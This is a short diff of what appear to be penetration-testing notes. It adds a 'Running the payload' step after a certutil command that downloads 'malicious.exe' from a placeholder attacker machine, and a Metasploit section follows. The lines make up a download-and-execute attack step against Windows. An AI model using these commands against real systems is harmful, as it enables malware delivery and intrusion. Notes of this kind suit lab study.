@@ -37,6 +37,12 @@ certutil -urlcache -f http://<ATTACKING MACHINE IP>/malicious.exe malicious.exe
 
 ![[Screenshot_2025-10-07_05-02-59.png]]
 
+## Running the payload
+
+```
+.\malicious.exe
+```
+
 
 ## Metasploit
 
